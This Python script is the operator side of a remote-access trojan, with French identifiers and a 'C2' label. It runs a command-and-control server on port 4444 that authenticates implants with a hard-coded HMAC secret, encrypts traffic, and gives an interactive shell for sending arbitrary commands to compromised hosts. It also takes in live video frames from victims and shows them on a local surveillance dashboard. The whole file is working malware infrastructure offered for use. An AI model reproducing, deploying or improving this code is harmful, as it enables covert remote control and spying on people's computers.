#!/usr/bin/env python3
import json
import os
import socket
import struct
import subprocess
import sys
import threading
import time
import webbrowser
import hashlib
import hmac
import secrets
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote

# --- CONFIGURATION ---
C2_PORT = 4444
VIDEO_PORT = 5001
WEB_PORT = 8080
SECRET = "PSK-2027-C2"
KEY = hashlib.sha256(b"c2_encryption_key_2027").digest()
HEADER_FORMAT = ">I"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)
MAX_FRAME = 8 * 1024 * 1024

# Variables globales
clients = {}
client_id_counter = 1
lock = threading.Lock()
flux = {}
verrou_flux = threading.Lock()

# --- CHIFFREMENT ---
def _keystream(length):
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(KEY + counter.to_bytes(8, "big")).digest()
        counter += 1
    return out[:length]

def _crypt(data):
    return bytes(a ^ b for a, b in zip(data, _keystream(len(data))))

def send_message(sock, message):
    data = json.dumps(message).encode("utf-8")
    enc = _crypt(data)
    sock.sendall(struct.pack(HEADER_FORMAT, len(enc)) + enc)

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connexion fermée")
        data += chunk
    return data

def recv_message(sock):
    header = _recv_exact(sock, HEADER_SIZE)
    length = struct.unpack(HEADER_FORMAT, header)[0]
    body = _recv_exact(sock, length)
    return json.loads(_crypt(body).decode("utf-8"))

def _hmac(secret, nonce):
    return hmac.new(secret.encode(), nonce.encode(), hashlib.sha256).hexdigest()

# --- GESTION C2 CLIENT ---
def handle_client(conn, addr):
    global client_id_counter
    cid = None
    try:
        info_msg = recv_message(conn)
        nonce = secrets.token_hex(16)
        send_message(conn, {"type": "challenge", "payload": nonce})
        auth_msg = recv_message(conn)
        
        if auth_msg.get("payload") != _hmac(SECRET, nonce):
            conn.close()
            return

        with lock:
            cid = client_id_counter
            client_id_counter += 1
            hostname = info_msg.get("payload", {}).get("hostname", "Inconnu")
            clients[cid] = {"conn": conn, "hostname": hostname, "addr": addr}
        
        print(f"\n[+] Nouveau client connecté ! ID: {cid} | Host: {hostname} | IP: {addr[0]}")
        print("C2 > ", end="", flush=True)

        while True:
            msg = recv_message(conn)
            if msg.get("type") == "result":
                print(f"\n[{hostname}] Sortie:\n{msg.get('payload')}")
            elif msg.get("type") == "error":
                print(f"\n[{hostname}] Erreur:\n{msg.get('payload')}")
            print("C2 > ", end="", flush=True)

    except Exception:
        pass
    finally:
        with lock:
            if cid in clients:
                del clients[cid]
                print(f"\n[-] Client {cid} ({addr[0]}) déconnecté.")
                print("C2 > ", end="", flush=True)
        conn.close()

def start_c2_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", C2_PORT))
    server.listen(5)
    print(f"[*] Serveur C2 en écoute sur le port {C2_PORT}...")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# --- VIDÉO (WEB DASHBOARD) ---
DASHBOARD = r'''
<!doctype html>
<html lang="fr">
<head><meta charset="utf-8"><title>Supervision</title>
<style>
body {margin:0;padding:24px;background:#10151d;color:#e8edf5;font:15px system-ui;}
.grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:16px;}
.card {background:#19222e;border:1px solid #394657;border-radius:12px;overflow:hidden;}
img {width:100%;aspect-ratio:16/9;object-fit:contain;background:#05080c;}
</style></head><body>
<h1>Flux vidéo en direct</h1>
<div id="streams" class="grid"></div>
<script>
async function refresh() {
    const res = await fetch("/api/streams");
    const streams = await res.json();
    const root = document.getElementById("streams");
    const ids = new Set(streams.map(x => x.client_id));
    for (const card of [...root.children]) { if (!ids.has(card.dataset.id)) card.remove(); }
    for (const x of streams) {
        if (![...root.children].find(c => c.dataset.id === x.client_id)) {
            const card = document.createElement("section");
            card.className = "card"; card.dataset.id = x.client_id;
            card.innerHTML = `<h2>${x.client_id}</h2><img src="/stream/${x.client_id}">`;
            root.append(card);
        }
    }
    if (!streams.length) root.textContent = "Aucun flux actif.";
}
refresh(); setInterval(refresh, 2000);
</script></body></html>
'''

def recevoir_video(connexion, adresse):
    client_id = "inconnu"
    try:
        connexion.settimeout(15)
        entete = bytearray()
        while len(entete) <= 512:
            octet = connexion.recv(1)
            if not octet: raise ConnectionError()
            if octet == b"\n": break
            entete.extend(octet)
        identite = json.loads(entete.decode("utf-8"))
        client_id = str(identite.get("client_id", "inconnu"))[:128]
        
        with verrou_flux:
            flux[client_id] = {"frame": None, "active": True}
        
        while True:
            entete = _recv_exact(connexion, 4)
            if not entete: break
            taille = struct.unpack("!I", entete)[0]
            if taille <= 0 or taille > MAX_FRAME: break
            image = _recv_exact(connexion, taille)
            if not image: break
            with verrou_flux:
                flux[client_id] = {"frame": image, "active": True}
    except Exception:
        pass
    finally:
        with verrou_flux:
            if client_id in flux: flux[client_id]["active"] = False
        connexion.close()

def start_video_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", VIDEO_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        threading.Thread(target=recevoir_video, args=(conn, addr), daemon=True).start()

class WebHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        chemin = unquote(self.path.split("?", 1)[0])
        if chemin == "/":
            corps = DASHBOARD.encode()
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
            self.wfile.write(corps); return
        if chemin == "/api/streams":
            with verrou_flux:
                donnees = [{"client_id": k, "active": v["active"]} for k, v in flux.items()]
            corps = json.dumps(donnees).encode()
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers()
            self.wfile.write(corps); return
        if chemin.startswith("/stream/"):
            client_id = chemin[len("/stream/"):]
            self.send_response(200); self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-store"); self.end_headers()
            while True:
                with verrou_flux:
                    info = flux.get(client_id)
                    image = info["frame"] if info else None
                if image:
                    self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " + str(len(image)).encode() + b"\r\n\r\n" + image + b"\r\n")
                    self.wfile.flush()
                time.sleep(0.05)
            return
        self.send_error(404)

def start_web_server():
    serveur = ThreadingHTTPServer(("127.0.0.1", WEB_PORT), WebHandler)
    serveur.daemon_threads = True
    threading.Thread(target=serveur.serve_forever, daemon=True).start()
    print(f"[*] Dashboard disponible sur http://127.0.0.1:{WEB_PORT}")
    webbrowser.open(f"http://127.0.0.1:{WEB_PORT}")

# --- INTERFACE INTERACTIVE ---
def main_menu():
    current_target = None
    while True:
        if current_target is None:
            prompt = "C2 > "
        else:
            with lock:
                if current_target not in clients:
                    current_target = None; continue
                hostname = clients[current_target]["hostname"]
            prompt = f"shell ({hostname}) > "

        try:
            cmd = input(prompt).strip()
        except KeyboardInterrupt:
            sys.exit(0)

        if not cmd: continue

        if current_target is None:
            if cmd == "list":
                with lock:
                    print("\nID | Hostname | IP\n" + "-"*40)
                    for k, v in clients.items():
                        print(f"{k:<2} | {v['hostname']:<10} | {v['addr'][0]}")
            elif cmd.startswith("use "):
                try:
                    cid = int(cmd.split()[1])
                    if cid in clients: current_target = cid
                    else: print("[-] Client introuvable.")
                except: pass
            elif cmd == "exit":
                sys.exit(0)
        else:
            if cmd == "back":
                current_target = None
            else:
                with lock:
                    conn = clients[current_target]["conn"]
                try:
                    send_message(conn, {"type": "command", "payload": cmd})
                    time.sleep(0.1)
                except Exception:
                    current_target = None

if __name__ == "__main__":
    threading.Thread(target=start_c2_server, daemon=True).start()
    threading.Thread(target=start_video_server, daemon=True).start()
    start_web_server()
    time.sleep(1)
    main_menu()
